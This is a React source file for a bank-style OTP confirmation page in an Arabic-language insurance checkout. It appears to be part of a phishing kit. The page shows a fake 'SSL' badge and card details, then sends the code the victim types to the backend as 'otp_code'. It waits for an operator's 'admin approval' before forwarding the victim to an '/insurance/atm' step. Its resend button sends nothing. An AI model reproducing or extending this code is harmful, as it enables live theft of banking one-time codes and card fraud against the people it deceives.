import { useState, useEffect, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { motion } from "framer-motion";
import { Button } from "@/components/ui/button";
import { Shield, Lock, RefreshCw, Loader2, CreditCard } from "lucide-react";
import InsuranceStepper from "@/components/InsuranceStepper";
import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval";
import { toast } from "sonner";
import { useLanguage } from "@/i18n/LanguageContext";

const OTPVerification = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { t } = useLanguage();
  const o = t.otp;
  const offer = location.state?.offer;
  const passedOrderId = location.state?.orderId || sessionStorage.getItem("insurance_order_id");
  const cardLastFour = location.state?.cardLastFour || sessionStorage.getItem("card_last_four") || "••••";
  const totalPrice = offer?.totalPrice || offer?.price || 0;
  const companyName = offer?.company || "بي كير";

  const [otp, setOtp] = useState("");
  const [loading, setLoading] = useState(false);
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [orderId, setOrderId] = useState<string | null>(passedOrderId);
  const [timer, setTimer] = useState(120);
  const [canResend, setCanResend] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  const approvalStatus = useAdminApproval(orderId, "otp");

  useEffect(() => { inputRef.current?.focus(); }, []);

  useEffect(() => {
    if (timer <= 0) { setCanResend(true); return; }
    const id = setInterval(() => setTimer((t) => t - 1), 1000);
    return () => clearInterval(id);
  }, [timer]);

  useEffect(() => {
    if (approvalStatus === "approved") {
      toast.success(o.verified);
      sessionStorage.setItem("insurance_order_id", orderId!);
      navigate("/insurance/atm", { state: { offer, orderId, cardLastFour } });
    } else if (approvalStatus === "rejected") {
      toast.error(o.rejected);
      setWaitingApproval(false);
      setLoading(false);
    }
  }, [approvalStatus, orderId, navigate, offer]);

  const handleVerify = async () => {
    if (otp.length < 4) return;
    setLoading(true);
    const id = await createOrUpdateStage(orderId, "otp", { otp_verified: false, otp_code: otp });
    setOrderId(id);
    setWaitingApproval(true);
  };

  const handleResend = () => {
    setTimer(120); setCanResend(false); setOtp("");
    inputRef.current?.focus();
  };

  const fmtTime = (s: number) => `${Math.floor(s / 60)}:${(s % 60).toString().padStart(2, "0")}`;

  return (
    <div className="min-h-[100dvh] bg-secondary/30">
      <div className="container mx-auto px-3 md:px-4 pt-8 pb-24 md:pb-12">
        <div className="max-w-5xl mx-auto">
          <InsuranceStepper active={2} />

          <div className="max-w-sm mx-auto">
            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }}>
              <div className="bg-card rounded-2xl border border-border shadow-sm overflow-hidden">

                {/* Header - Bank style */}
                <div className="bg-primary/5 border-b border-border px-5 py-4">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <div className="w-8 h-8 rounded-lg bg-primary/10 flex items-center justify-center">
                        <CreditCard className="w-4 h-4 text-primary" />
                      </div>
                      <span className="text-xs font-semibold text-foreground">{o.title}</span>
                    </div>
                    <div className="flex items-center gap-1.5">
                      <Lock className="w-3 h-3 text-primary/60" />
                      <span className="text-[10px] text-muted-foreground">SSL</span>
                    </div>
                  </div>
                </div>

                {/* Transaction details */}
                <div className="px-5 pt-5 pb-4 space-y-3">
                  <div className="flex items-center justify-between text-xs">
                    <span className="text-muted-foreground">التاجر</span>
                    <span className="font-semibold text-foreground">{companyName}</span>
                  </div>
                  <div className="flex items-center justify-between text-xs">
                    <span className="text-muted-foreground">المبلغ</span>
                    <span className="font-bold text-foreground text-sm">{totalPrice.toLocaleString()} ر.س</span>
                  </div>
                  <div className="flex items-center justify-between text-xs">
                    <span className="text-muted-foreground">البطاقة</span>
                    <span className="font-mono font-semibold text-foreground tracking-wider" dir="ltr">•••• {cardLastFour}</span>
                  </div>
                  <div className="border-t border-dashed border-border" />
                </div>

                {waitingApproval ? (
                  <div className="px-5 pb-5 space-y-4 text-center py-6">
                    <Loader2 className="w-10 h-10 text-primary animate-spin mx-auto" />
                    <h3 className="text-sm font-bold text-foreground">{o.waitingApproval}</h3>
                    <p className="text-xs text-muted-foreground">{o.waitingReview}</p>
                  </div>
                ) : (
                  <div className="px-5 pb-5">
                    <label className="block text-xs font-medium text-foreground mb-2">{o.subtitle}</label>
                    <div className="relative" dir="ltr">
                      <input
                        ref={inputRef}
                        type="text"
                        inputMode="numeric"
                        value={otp}
                        onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
                        placeholder="••••••"
                        className="w-full h-12 text-center text-xl font-bold tracking-[0.5em] rounded-xl border-2 border-border bg-background text-foreground focus:border-primary focus:ring-2 focus:ring-primary/20 focus:outline-none transition-all placeholder:tracking-[0.3em] placeholder:text-muted-foreground/40"
                      />
                    </div>

                    {/* Timer / Resend */}
                    <div className="flex justify-center mt-3 mb-4">
                      {canResend ? (
                        <button onClick={handleResend} className="flex items-center gap-1.5 text-xs text-primary hover:text-primary/80 font-medium transition-colors">
                          <RefreshCw className="w-3.5 h-3.5" />{o.resendCode}
                        </button>
                      ) : (
                        <div className="inline-flex items-center gap-1.5 bg-secondary/70 rounded-full px-3 py-1">
                          <span className="text-[10px] text-muted-foreground">{o.resendIn}</span>
                          <span className="text-xs text-primary font-bold font-mono">{fmtTime(timer)}</span>
                        </div>
                      )}
                    </div>

                    {loading && (
                      <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex items-center justify-center gap-2 mb-3">
                        <Loader2 className="w-4 h-4 text-primary animate-spin" />
                        <span className="text-xs text-muted-foreground">{o.verifying}</span>
                      </motion.div>
                    )}

                    <Button
                      onClick={handleVerify}
                      disabled={loading || otp.length < 4}
                      className="w-full bg-cta text-cta-foreground hover:bg-cta-hover rounded-xl py-5 font-bold text-sm gap-2"
                    >
                      {loading ? (
                        <><Loader2 className="w-4 h-4 animate-spin" />{o.verifying}</>
                      ) : (
                        <><Lock className="w-3.5 h-3.5" />{o.confirmPayment}</>
                      )}
                    </Button>
                  </div>
                )}

                {/* Footer */}
                <div className="bg-secondary/40 border-t border-border px-5 py-3 flex items-center justify-center gap-2">
                  <Shield className="w-3.5 h-3.5 text-primary/60" />
                  <span className="text-[10px] text-muted-foreground">{o.secureProcess}</span>
                </div>
              </div>
            </motion.div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default OTPVerification;
